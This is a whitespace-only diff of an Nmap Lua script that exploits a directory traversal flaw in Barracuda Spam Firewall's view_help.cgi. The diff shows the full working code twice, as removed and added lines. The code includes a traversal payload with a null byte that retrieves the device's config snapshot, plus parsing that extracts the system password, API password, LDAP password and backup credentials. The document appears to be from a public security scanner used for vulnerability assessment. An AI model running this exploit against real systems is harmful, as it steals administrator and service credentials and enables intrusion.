@@ -27,10 +27,10 @@ http://www.exploit-db.com/exploits/15130/
 -- nmap --script http-barracuda-dir-traversal --script-args http-max-cache-size=5000000 -p <port> <host>
 --
 -- @args http-max-cache-size
---		   Set max cache size. The default value is 100,000.
---		   Barracuda config files vary in size mostly due to the number
---		   of users. Using a max cache size of 5,000,000 bytes should be
---		   enough for config files containing up to 5,000 users.
+--       Set max cache size. The default value is 100,000.
+--       Barracuda config files vary in size mostly due to the number
+--       of users. Using a max cache size of 5,000,000 bytes should be
+--       enough for config files containing up to 5,000 users.
 --
 -- @output
 -- PORT   STATE SERVICE   REASON
@@ -85,100 +85,100 @@ portrule = shortport.port_or_service (8000, "barracuda", {"tcp"})
 
 action = function(host, port)
 
-	local result = {}
-	local paths = {"/cgi-bin/view_help.cgi", "/cgi-mod/view_help.cgi"}
-	local payload = "?locale=/../../../../../../../mail/snapshot/config.snapshot%00"
-	local user_count = 0
-	local config_file = ""
+  local result = {}
+  local paths = {"/cgi-bin/view_help.cgi", "/cgi-mod/view_help.cgi"}
+  local payload = "?locale=/../../../../../../../mail/snapshot/config.snapshot%00"
+  local user_count = 0
+  local config_file = ""
 
-	-- Loop through vulnerable files
-	stdnse.print_debug(1, ("%s: Connecting to %s:%s"):format(SCRIPT_NAME, host.targetname or host.ip, port.number))
-	for _, path in ipairs(paths) do
+  -- Loop through vulnerable files
+  stdnse.print_debug(1, ("%s: Connecting to %s:%s"):format(SCRIPT_NAME, host.targetname or host.ip, port.number))
+  for _, path in ipairs(paths) do
 
-		-- Retrieve file
-  	local data = http.get(host, port, tostring(path))
-  	if data and data.status then
+    -- Retrieve file
+    local data = http.get(host, port, tostring(path))
+    if data and data.status then
 
-			-- Check if file exists
-  		stdnse.print_debug(1, "%s: HTTP %s: %s", SCRIPT_NAME, data.status, tostring(path))
-			if tostring(data.status):match("200") then
+      -- Check if file exists
+      stdnse.print_debug(1, "%s: HTTP %s: %s", SCRIPT_NAME, data.status, tostring(path))
+      if tostring(data.status):match("200") then
 
-				-- Attempt config file retrieval with LFI exploit
-  			stdnse.print_debug(1, "%s: Exploiting: %s", SCRIPT_NAME, tostring(path .. payload))
-	  		data = http.get(host, port, tostring(path .. payload))
-				if data and data.status and tostring(data.status):match("200") and data.body and data.body ~= "" then
+        -- Attempt config file retrieval with LFI exploit
+        stdnse.print_debug(1, "%s: Exploiting: %s", SCRIPT_NAME, tostring(path .. payload))
+        data = http.get(host, port, tostring(path .. payload))
+        if data and data.status and tostring(data.status):match("200") and data.body and data.body ~= "" then
 
-					-- Check if the HTTP response contains a valid config file in MySQL database dump format
-  				if string.match(data.body, "DROP TABLE IF EXISTS config;") and string.match(data.body, "barracuda%.css") then
-						config_file = data.body
-						break
-					end
+          -- Check if the HTTP response contains a valid config file in MySQL database dump format
+          if string.match(data.body, "DROP TABLE IF EXISTS config;") and string.match(data.body, "barracuda%.css") then
+            config_file = data.body
+            break
+          end
 
-				else
-  				stdnse.print_debug(1, "%s: Failed to retrieve file: %s", SCRIPT_NAME, tostring(path .. payload))
-				end
+        else
+          stdnse.print_debug(1, "%s: Failed to retrieve file: %s", SCRIPT_NAME, tostring(path .. payload))
+        end
 
-			end
+      end
 
-		else
-  		stdnse.print_debug(1, "%s: Failed to retrieve file: %s", SCRIPT_NAME, tostring(path))
-		end
+    else
+      stdnse.print_debug(1, "%s: Failed to retrieve file: %s", SCRIPT_NAME, tostring(path))
+    end
 
-	end
+  end
 
-	-- No config file found
-	if config_file == "" then
-  	stdnse.print_debug(1, ("%s: %s:%s is not vulnerable or connection timed out."):format(SCRIPT_NAME, host.targetname or host.ip, port.number))
-		return
-	end
+  -- No config file found
+  if config_file == "" then
+    stdnse.print_debug(1, ("%s: %s:%s is not vulnerable or connection timed out."):format(SCRIPT_NAME, host.targetname or host.ip, port.number))
+    return
+  end
 
-	-- Extract system info from config file in MySQL dump format
-	stdnse.print_debug(1, "%s: Exploit success! Extracting system info from MySQL database dump", SCRIPT_NAME)
+  -- Extract system info from config file in MySQL dump format
+  stdnse.print_debug(1, "%s: Exploit success! Extracting system info from MySQL database dump", SCRIPT_NAME)
 
-	-- Count users
-	if string.match(config_file, "'user_default_email_address',") then
-		for _ in string.gmatch(config_file, "'user_default_email_address',") do user_count = user_count + 1 end
-	end
-	table.insert(result, string.format("Users: %s", user_count))
+  -- Count users
+  if string.match(config_file, "'user_default_email_address',") then
+    for _ in string.gmatch(config_file, "'user_default_email_address',") do user_count = user_count + 1 end
+  end
+  table.insert(result, string.format("Users: %s", user_count))
 
-	-- Extract system info
-	local vars = {
-		{"Device", "branding_device_name"},
-		{"Version","httpd_last_release_notes_version_read"},
-		{"Hostname","system_default_hostname"},
-		{"Domain","system_default_domain"},
-		{"Timezone","system_timezone"},
-		{"Language","default_ndr_lang"},
-		{"Password","system_password"},
-		{"API Password","api_password"},
-		{"MTA SASL LDAP Password","mta_sasl_ldap_advanced_password"},
-		{"Gateway","system_gateway"},
-		{"Primary DNS","system_primary_dns_server"},
-		{"Secondary DNS","system_secondary_dns_server"},
-		{"DNS Cache","dns_cache"},
-		{"Backup Server","backup_server"},
-		{"Backup Port","backup_port"},
-		{"Backup Type","backup_type"},
-		{"Backup Username","backup_username"},
-		{"Backup Password","backup_password"},
-		{"NTP Enabled","system_ntp"},
-		{"NTP Server","system_ntp_server"},
-		{"SSH Enabled","system_ssh_enable"},
-		{"BRTS Enabled","brts_enable"},
-		{"BRTS Server","brts_lookup_domain"},
-		{"HTTP Port","http_port"},
-		{"HTTP Disabled","http_shutoff"},
-		{"HTTPS Port","https_port"},
-		{"HTTPS Only","https_only"},
-	}
-	for _, var in ipairs(vars) do
-		local var_match = string.match(config_file, string.format("'%s','([^']+)','global',", var[2]))
-		if var_match then table.insert(result, string.format("%s: %s", var[1], var_match)) end
-	end
+  -- Extract system info
+  local vars = {
+    {"Device", "branding_device_name"},
+    {"Version","httpd_last_release_notes_version_read"},
+    {"Hostname","system_default_hostname"},
+    {"Domain","system_default_domain"},
+    {"Timezone","system_timezone"},
+    {"Language","default_ndr_lang"},
+    {"Password","system_password"},
+    {"API Password","api_password"},
+    {"MTA SASL LDAP Password","mta_sasl_ldap_advanced_password"},
+    {"Gateway","system_gateway"},
+    {"Primary DNS","system_primary_dns_server"},
+    {"Secondary DNS","system_secondary_dns_server"},
+    {"DNS Cache","dns_cache"},
+    {"Backup Server","backup_server"},
+    {"Backup Port","backup_port"},
+    {"Backup Type","backup_type"},
+    {"Backup Username","backup_username"},
+    {"Backup Password","backup_password"},
+    {"NTP Enabled","system_ntp"},
+    {"NTP Server","system_ntp_server"},
+    {"SSH Enabled","system_ssh_enable"},
+    {"BRTS Enabled","brts_enable"},
+    {"BRTS Server","brts_lookup_domain"},
+    {"HTTP Port","http_port"},
+    {"HTTP Disabled","http_shutoff"},
+    {"HTTPS Port","https_port"},
+    {"HTTPS Only","https_only"},
+  }
+  for _, var in ipairs(vars) do
+    local var_match = string.match(config_file, string.format("'%s','([^']+)','global',", var[2]))
+    if var_match then table.insert(result, string.format("%s: %s", var[1], var_match)) end
+  end
 
-	table.insert(result, "\nVulnerable to directory traversal vulnerability:\nhttp://seclists.org/fulldisclosure/2010/Oct/119")
+  table.insert(result, "\nVulnerable to directory traversal vulnerability:\nhttp://seclists.org/fulldisclosure/2010/Oct/119")
 
-	-- Return results
-	return stdnse.format_output(true, result)
+  -- Return results
+  return stdnse.format_output(true, result)
 
 end
